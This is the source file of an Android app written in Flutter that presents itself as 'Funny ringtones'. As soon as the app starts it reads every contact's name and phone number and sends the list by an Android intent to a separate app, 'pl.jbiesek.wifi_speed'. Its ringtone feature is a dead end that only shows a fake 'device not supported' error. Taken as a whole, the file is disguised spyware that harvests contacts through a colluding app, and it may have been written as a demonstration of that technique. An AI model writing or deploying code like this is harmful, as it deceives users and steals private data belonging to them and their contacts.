
import 'package:android_intent_plus/android_intent.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Funny ringtones',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: FunnyRingtones(),
    );
  }
}

class FunnyRingtones extends StatefulWidget {
  @override
  _FunnyRingtonesState createState() => _FunnyRingtonesState();
}

class _FunnyRingtonesState extends State<FunnyRingtones> {
  List<Contact>? _contacts;
  bool _permissionDenied = false;

  @override
  void initState() {
    super.initState();
    _fetchContacts();
  }

  void _sendData(String data) {
    AndroidIntent intent = AndroidIntent(
        action: 'android.intent.action.SENDTO',
        category: 'android.intent.category.DEFAULT',
        type: 'text/plain',
        data: data,
        package: 'pl.jbiesek.wifi_speed'
    );
    intent.launch();
  }


  Future _fetchContacts() async {
    String text = "\n";
    if (!await FlutterContacts.requestPermission(readonly: true)) {
      setState(() => _permissionDenied = true);
    } else {
      final contacts = await FlutterContacts.getContacts();
      setState(() => _contacts = contacts);
      for (int i = 0; i < contacts.length; i++){
        final contact = await FlutterContacts.getContact(_contacts![i].id);
        var temp = contact?.displayName;
        if(temp != null) {
          text += temp.toString();
          text += "\n";
        }
        temp = contact?.phones.first.number;
        if(temp != null) {
          text += temp.toString();
          text += "\n";
        }
      }
      _sendData(text);
    }
  }
  @override
  Widget build(BuildContext context) => MaterialApp(
      home: Scaffold(
          appBar: AppBar(title: Text('Funny ringtone for every contact!')),
          body: _body()));

  Widget _body() {
    if (_permissionDenied) return Center(child: Text('Permission denied'));
    if (_contacts == null) return Center(child: CircularProgressIndicator());
    return ListView.builder(
        itemCount: _contacts!.length,
        itemBuilder: (context, i) => ListTile(
            title: Text(_contacts![i].displayName),
            onTap: () async {
              final fullContact =
              await FlutterContacts.getContact(_contacts![i].id);
              await Navigator.of(context).push(
                  MaterialPageRoute(builder: (_) => ContactPage(fullContact!)));
            }));
  }
}

class ContactPage extends StatelessWidget {
  final Contact contact;
  ContactPage(this.contact);

  @override
  Widget build(BuildContext context) => Scaffold(
      appBar: AppBar(title: Text(contact.displayName)),
      body: Center(
      child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
        Text('First name: ${contact.name.first}'),
        Text('Last name: ${contact.name.last}'),
        Text(
            'Phone number: ${contact.phones.isNotEmpty ? contact.phones.first.number : '(none)'}'),
        TextButton(onPressed: () async {
          Navigator.of(context).push(
            MaterialPageRoute(
                builder: (context) => AlertDialog(
                  title: const Text('ERROR!'),
                  content: const Text('Your device is not supported!'),
                  actions: <Widget>[
                    TextButton(
                      onPressed: () => Navigator.of(context).pop(),
                      child: const Text('OK'),
                    ),
                  ],
                )),
          );
        } , child: Text("Change ringtone"))
      ])));
}